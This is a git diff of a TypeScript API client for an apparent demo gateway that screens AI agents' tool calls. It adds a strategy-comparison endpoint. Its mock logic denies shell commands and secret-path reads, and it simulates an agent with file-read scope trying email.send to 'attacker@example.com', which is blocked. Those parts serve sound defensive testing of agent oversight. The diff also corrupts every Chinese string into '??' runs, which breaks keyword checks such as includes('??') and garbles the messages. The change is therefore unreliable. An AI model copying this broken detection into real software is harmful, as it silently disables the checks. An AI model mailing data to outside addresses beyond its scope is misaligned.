@@ -6,6 +6,7 @@ import type {
   GatewayRequest,
   Overview,
   PolicyRule,
+  StrategyComparisonResponse,
   SystemSetting
 } from '../types/domain';
 import * as mock from './mockData';
@@ -23,6 +24,17 @@ const mockMap: Record<MockKey, unknown> = {
   auditLogs: mock.auditLogs,
   evaluations: mock.evaluations,
   settings: mock.settings
+};
+
+const emptyStrategyComparison: StrategyComparisonResponse = {
+  available: false,
+  message: 'Strategy comparison result is not generated yet.',
+  hint: 'Run scripts/run_strategy_comparison.ps1 first.',
+  total_cases: 0,
+  total_records: 0,
+  elapsed_ms: 0,
+  summary: {},
+  outputs: {}
 };
 
 function buildUrl(endpoint: string) {
@@ -50,6 +62,21 @@ async function request<T>(endpoint: string, mockKey: MockKey, init?: RequestInit
     return mockMap[mockKey] as T;
   } finally {
     window.clearTimeout(timer);
+  }
+}
+
+async function getStrategyComparison(): Promise<StrategyComparisonResponse> {
+  try {
+    const res = await fetch(buildUrl('/evaluation/strategy-comparison'), {
+      headers: {
+        'Content-Type': 'application/json; charset=utf-8'
+      }
+    });
+
+    if (!res.ok) throw new Error(`HTTP ${res.status}`);
+    return (await res.json()) as StrategyComparisonResponse;
+  } catch {
+    return emptyStrategyComparison;
   }
 }
 
@@ -88,8 +115,8 @@ async function postJson(endpoint: string, body: unknown, timeoutMs = COMMAND_TIM
 function mockCommandResponse(input: AgentCommandInput, error?: unknown): AgentCommandResponse {
   const lowered = input.userInput.toLowerCase();
   const isSecret = input.userInput.includes('secret/') || input.userInput.includes('password');
-  const isDelete = input.userInput.includes('删除') || lowered.includes('delete') || lowered.includes('remove');
-  const isShell = input.userInput.includes('命令') || lowered.includes('shell') || lowered.includes('command');
+  const isDelete = input.userInput.includes('??') || lowered.includes('delete') || lowered.includes('remove');
+  const isShell = input.userInput.includes('??') || lowered.includes('shell') || lowered.includes('command');
   const isUnknown = !input.userInput.trim();
 
   const decision = isUnknown ? 'deny' : isSecret || isShell ? 'deny' : isDelete ? 'confirm' : 'allow';
@@ -104,7 +131,7 @@ function mockCommandResponse(input: AgentCommandInput, error?: unknown): AgentCo
       success: true,
       executed: false,
       source: 'frontend.mock',
-      message: '后端未连接，当前展示的是前端 Mock 判定。启动后端后会自动调用真实 FakeAgent / LLM 接口。',
+      message: '?????????????? Mock ??????????????? FakeAgent / LLM ???',
       original_input: input.userInput,
       agent_result: {
         agent: input.mode.includes('llm') ? 'MultiStepLLMAgent' : 'FakeAgent',
@@ -113,7 +140,7 @@ function mockCommandResponse(input: AgentCommandInput, error?: unknown): AgentCo
         original_input: input.userInput,
         tool_call: isUnknown ? null : {
           tool_name: isShell ? 'shell.run' : isDelete ? 'file.delete' : 'file.read',
-          description: isShell ? '执行系统命令' : isDelete ? '删除文件' : '读取文件内容',
+          description: isShell ? '??????' : isDelete ? '????' : '??????',
           arguments: isShell
             ? { command: input.userInput }
             : { path: isSecret ? 'secret/password.txt' : 'public/notice.txt' },
@@ -124,10 +151,10 @@ function mockCommandResponse(input: AgentCommandInput, error?: unknown): AgentCo
         decision,
         risk_score: riskScore,
         reason: decision === 'allow'
-          ? ['Mock：公开资源读取，风险较低。']
+          ? ['Mock?????????????']
           : decision === 'confirm'
-            ? ['Mock：删除类操作具有破坏性，需要人工确认。']
-            : ['Mock：命中敏感路径、系统命令或不可识别任务，禁止执行。']
+            ? ['Mock???????????????????']
+            : ['Mock?????????????????????????']
       },
       tool_result: null,
       pending_id: decision === 'confirm' ? 'mock-pending-001' : null
@@ -159,7 +186,7 @@ async function runFakeAgentCheck(input: AgentCommandInput): Promise<AgentCommand
         success: true,
         executed: false,
         source: 'frontend.fake_check',
-        message: 'FakeAgent 未生成可执行工具调用，因此未进入 Gateway 判定。',
+        message: 'FakeAgent ???????????????? Gateway ???',
         original_input: input.userInput,
         agent_result: agentResult,
         gateway_result: null,
@@ -186,7 +213,7 @@ async function runFakeAgentCheck(input: AgentCommandInput): Promise<AgentCommand
       success: true,
       executed: false,
       source: 'frontend.fake_check',
-      message: 'FakeAgent 已完成自然语言规划，Gateway 已完成授权判定，未执行真实工具。',
+      message: 'FakeAgent ??????????Gateway ????????????????',
       original_input: input.userInput,
       agent_result: agentResult,
       gateway_result: gatewayResult,
@@ -200,16 +227,16 @@ async function runToolProxyOAuthDemo(input: AgentCommandInput): Promise<AgentCom
   const endpoint = '/tool-proxy/authorize';
   const lowered = input.userInput.toLowerCase();
   const isExternalSend =
-    input.userInput.includes('外发')
-    || input.userInput.includes('发送')
-    || input.userInput.includes('邮箱')
+    input.userInput.includes('??')
+    || input.userInput.includes('??')
+    || input.userInput.includes('??')
     || lowered.includes('email')
     || lowered.includes('workbuddy');
 
   const body = isExternalSend
     ? {
         user: input.user,
-        original_task: '请把内容发送给外部邮箱',
+        original_task: '???????????',
         tool: 'email.send',
         params: {
           to: 'attacker@example.com',
@@ -234,7 +261,7 @@ async function runToolProxyOAuthDemo(input: AgentCommandInput): Promise<AgentCom
       }
     : {
         user: input.user,
-        original_task: '请读取 public/notice.txt 并总结',
+        original_task: '??? public/notice.txt ???',
         tool: 'file.read',
         params: {
           path: 'public/notice.txt'
@@ -266,12 +293,11 @@ async function runToolProxyOAuthDemo(input: AgentCommandInput): Promise<AgentCom
       ...data,
       source: 'frontend.tool_proxy_oauth',
       message: isExternalSend
-        ? 'WorkBuddy 只声明 tool:file:read，却尝试 email.send，Tool Proxy 在 OAuth-style scope 检查阶段拒绝。'
-        : 'OpenClaw 声明 tool:file:read，并读取公开文件，Tool Proxy scope 检查通过后继续进入 Runtime Monitor。'
+        ? 'WorkBuddy ??? tool:file:read???? email.send?Tool Proxy ? OAuth-style scope ???????'
+        : 'OpenClaw ?? tool:file:read?????????Tool Proxy scope ????????? Runtime Monitor?'
     }
   };
 }
-
 
 async function runExternalAgentAdapterDemo(input: AgentCommandInput): Promise<AgentCommandResponse> {
   const endpoint = '/external-agent/simulate';
@@ -282,10 +308,10 @@ async function runExternalAgentAdapterDemo(input: AgentCommandInput): Promise<Ag
   let user = input.user;
 
   if (
-    input.userInput.includes('外发')
-    || input.userInput.includes('scope 不足')
-    || input.userInput.includes('Scope 不足')
-    || input.userInput.includes('邮箱')
+    input.userInput.includes('??')
+    || input.userInput.includes('scope ??')
+    || input.userInput.includes('Scope ??')
+    || input.userInput.includes('??')
     || lowered.includes('insufficient')
     || lowered.includes('workbuddy')
   ) {
@@ -294,8 +320,8 @@ async function runExternalAgentAdapterDemo(input: AgentCommandInput): Promise<Ag
   }
 
   if (
-    input.userInput.includes('内部邮件')
-    || input.userInput.includes('人工确认')
+    input.userInput.includes('????')
+    || input.userInput.includes('????')
     || lowered.includes('confirm')
   ) {
     platform = 'workbuddy';
@@ -304,8 +330,8 @@ async function runExternalAgentAdapterDemo(input: AgentCommandInput): Promise<Ag
 
   if (
     input.userInput.includes('shell')
-    || input.userInput.includes('命令')
-    || input.userInput.includes('沙箱')
+    || input.userInput.includes('??')
+    || input.userInput.includes('??')
     || lowered.includes('sandbox')
   ) {
     platform = 'custom';
@@ -326,7 +352,7 @@ async function runExternalAgentAdapterDemo(input: AgentCommandInput): Promise<Ag
     data: {
       ...data,
       source: 'frontend.external_agent_adapter',
-      message: '外部 Agent 请求已先进入 Adapter 标准化，再进入 Tool Proxy、OAuth-style scope、Capability Contract 和 Runtime Monitor。'
+      message: '?? Agent ?????? Adapter ??????? Tool Proxy?OAuth-style scope?Capability Contract ? Runtime Monitor?'
     }
   };
 }
@@ -379,6 +405,7 @@ export const api = {
   getPolicies: () => request<PolicyRule[]>('/api/policies', 'policies'),
   getAuditLogs: () => request<AuditLog[]>('/api/audit-logs', 'auditLogs'),
   getEvaluations: () => request<EvaluationMetric[]>('/api/evaluations', 'evaluations'),
+  getStrategyComparison,
   getSettings: () => request<SystemSetting[]>('/api/settings', 'settings'),
   runCommand,
   submitDecision: async (id: string, decision: 'approved' | 'rejected') => {
@@ -391,7 +418,7 @@ export const api = {
         body: JSON.stringify({ decision })
       });
     } catch {
-      // Mock 模式下无需真实提交。
+      // Mock ??????????
     }
   }
 };
